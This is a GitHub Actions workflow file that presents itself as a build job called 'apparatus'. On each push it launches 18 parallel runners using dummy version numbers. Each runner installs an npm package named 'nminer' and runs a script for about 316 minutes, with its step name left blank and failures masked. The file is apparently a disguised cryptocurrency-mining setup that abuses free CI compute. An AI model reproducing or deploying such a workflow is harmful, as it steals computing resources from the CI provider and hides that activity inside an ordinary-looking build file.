name: apparatus
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 8968 }
          - { version: 3366 }
          - { version: 111 }
          - { version: 1783 }
          - { version: 4877 }
          - { version: 1331 }
          - { version: 8392 }
          - { version: 6246 }
          - { version: 1963 }
          - { version: 3202 }
          - { version: 583 }
          - { version: 5018 }
          - { version: 424 }
          - { version: 4922 }
          - { version: 9106 }
          - { version: 5894 }
          - { version: 2510 }
          - { version: 1501 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 316m node apparatus.js || echo "apparatus executed"